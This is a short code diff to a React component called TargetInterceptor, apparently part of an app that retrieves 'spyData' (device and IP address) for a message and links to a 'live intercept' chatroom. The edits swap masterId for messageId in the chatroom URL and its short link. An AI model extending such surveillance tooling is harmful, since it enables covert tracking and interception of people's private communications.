@@ -11,7 +11,7 @@ export default function TargetInterceptor() {
   const toast = useToast();
   const [messageId, setMessageId] = useState("");
   const [loading, setLoading] = useState(false);
-  const [result, setResult] = useState<{ masterId: string; device: string; ip: string } | null>(null);
+  const [result, setResult] = useState<{ messageId: string; masterId: string; device: string; ip: string } | null>(null);
   const [error, setError] = useState("");
   const [creatorId, setCreatorId] = useState("");
   const [shortLink, setShortLink] = useState("");
@@ -55,6 +55,7 @@ export default function TargetInterceptor() {
 
       // 4. Success! Set the data
       setResult({
+        messageId: messageId,
         masterId: spyData.masterId,
         device: spyData.os_platform || "Unknown Device",
         ip: spyData.ip || "Hidden"
@@ -78,7 +79,7 @@ export default function TargetInterceptor() {
     try {
       const { data: { user } } = await supabase.auth.getUser();
       const slug = generateSlug(6);
-      const chatroomUrl = `${window.location.origin}/live/${result.masterId}/${creatorId}`;
+      const chatroomUrl = `${window.location.origin}/live/${result.messageId}/${creatorId}`;
       await supabase.from('short_links').insert({
         slug,
         original_url: chatroomUrl,
@@ -158,7 +159,7 @@ export default function TargetInterceptor() {
 
                 {/* THE MAGIC LINK (Corrected Logic) */}
                 <Link
-                    href={`/live/${result.masterId}/${creatorId}`}
+                    href={`/live/${result.messageId}/${creatorId}`}
                     className="block w-full py-3 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-bold text-black text-center hover:shadow-[0_0_20px_rgba(16,185,129,0.5)] hover:scale-[1.02] transition-all text-sm uppercase tracking-widest"
                 >
                     INITIATE LIVE INTERCEPT ⚡
